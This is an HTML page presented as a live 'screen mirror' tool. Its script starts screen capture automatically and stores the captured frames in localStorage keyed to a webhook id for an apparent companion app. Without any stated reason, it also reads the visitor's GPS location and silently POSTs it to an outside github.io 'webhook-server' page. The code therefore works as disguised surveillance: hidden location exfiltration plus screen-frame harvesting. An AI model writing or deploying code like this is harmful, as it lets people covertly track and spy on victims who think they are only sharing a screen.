<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Screen Mirror Direct</title>
    <style>
        body { 
            background: #000; 
            color: #ff0000; 
            font-family: monospace; 
            text-align: center; 
            padding: 20px; 
        }
        #status { 
            margin: 20px 0; 
            padding: 15px; 
            background: #330000; 
            border-radius: 5px;
        }
        .mirror-display {
            margin: 20px 0;
            background: #0a0000;
            border: 2px solid #660000;
            border-radius: 10px;
            padding: 10px;
            min-height: 300px;
        }
        video, canvas {
            width: 100%;
            max-width: 600px;
            height: auto;
            border: 1px solid #ff0000;
        }
    </style>
</head>
<body>
    <h2>ðŸ“º LIVE SCREEN MIRROR</h2>
    <div id="status">Starting screen mirror...</div>
    
    <div class="mirror-display">
        <video id="screenVideo" autoplay muted style="display: none;"></video>
        <canvas id="mirrorCanvas" style="display: none;"></canvas>
        <div id="placeholder">
            <p>ðŸ“º Screen will appear here</p>
            <p>Allow screen sharing when prompted</p>
        </div>
    </div>
    
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const webhookId = urlParams.get('webhook') || 'mirror_' + Date.now();
        let isStreaming = false;
        let frameCount = 0;
        
        async function startScreenMirror() {
            try {
                document.getElementById('status').innerHTML = 'ðŸ”„ Requesting screen access...';
                
                // Check browser support
                if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
                    throw new Error('Screen sharing not supported. Use Chrome/Firefox/Edge desktop.');
                }
                
                // Request screen sharing
                const stream = await navigator.mediaDevices.getDisplayMedia({
                    video: { 
                        width: { ideal: 1280 }, 
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                const video = document.getElementById('screenVideo');
                const canvas = document.getElementById('mirrorCanvas');
                const ctx = canvas.getContext('2d');
                
                video.srcObject = stream;
                video.style.display = 'block';
                canvas.style.display = 'block';
                document.getElementById('placeholder').style.display = 'none';
                
                document.getElementById('status').innerHTML = 'âœ… Screen mirror active - Streaming live';
                isStreaming = true;
                
                // Start continuous mirroring
                video.onloadedmetadata = () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    function mirrorFrame() {
                        if (!isStreaming) return;
                        
                        // Draw current frame
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // Convert to image data
                        const imageData = canvas.toDataURL('image/jpeg', 0.6);
                        frameCount++;
                        
                        // Store for Android app - MULTIPLE METHODS
                        const mirrorData = {
                            screenData: imageData,
                            timestamp: new Date().toISOString(),
                            frame: frameCount,
                            webhook: webhookId,
                            type: 'screen_mirror'
                        };
                        
                        // Method 1: Direct localStorage
                        localStorage.setItem('mirror_' + webhookId, imageData);
                        
                        // Method 2: Structured data
                        localStorage.setItem('mirror_data_' + webhookId, JSON.stringify(mirrorData));
                        
                        // Method 3: Window property
                        window.mirrorData = mirrorData;
                        
                        // Method 4: Global broadcast
                        localStorage.setItem('global_mirror', JSON.stringify({
                            webhook: webhookId,
                            data: imageData,
                            timestamp: Date.now(),
                            frame: frameCount
                        }));
                        
                        // Update status
                        document.getElementById('status').innerHTML = 
                            `ðŸ“º Live Mirror - Frame ${frameCount} - ${new Date().toLocaleTimeString()}`;
                        
                        // Continue mirroring
                        requestAnimationFrame(mirrorFrame);
                    }
                    
                    // Start mirroring
                    mirrorFrame();
                };
                
                // Handle stream end
                stream.getVideoTracks()[0].onended = () => {
                    isStreaming = false;
                    document.getElementById('status').innerHTML = 'ðŸ”´ Screen sharing stopped';
                };
                
            } catch (error) {
                let errorMsg = error.message;
                if (error.name === 'NotAllowedError') {
                    errorMsg = 'Permission denied. Please allow screen sharing.';
                } else if (error.name === 'NotSupportedError') {
                    errorMsg = 'Not supported. Use Chrome/Firefox/Edge desktop.';
                }
                document.getElementById('status').innerHTML = 'âŒ ' + errorMsg;
            }
        }
        
        // Auto start
        setTimeout(startScreenMirror, 1000);
        
        // Keep connection alive
        setInterval(() => {
            if (isStreaming) {
                localStorage.setItem('mirror_heartbeat_' + webhookId, Date.now().toString());
            }
        }, 1000);
        
        // Also capture GPS location
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date().toISOString(),
                        webhook: webhookId
                    };
                    
                    fetch('https://bojourx-tos.github.io/speedtest-pro/webhook-server.html', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(locationData)
                    }).catch(() => {});
                },
                (error) => console.log('Location access denied')
            );
        }
    </script>
</body>
</html>
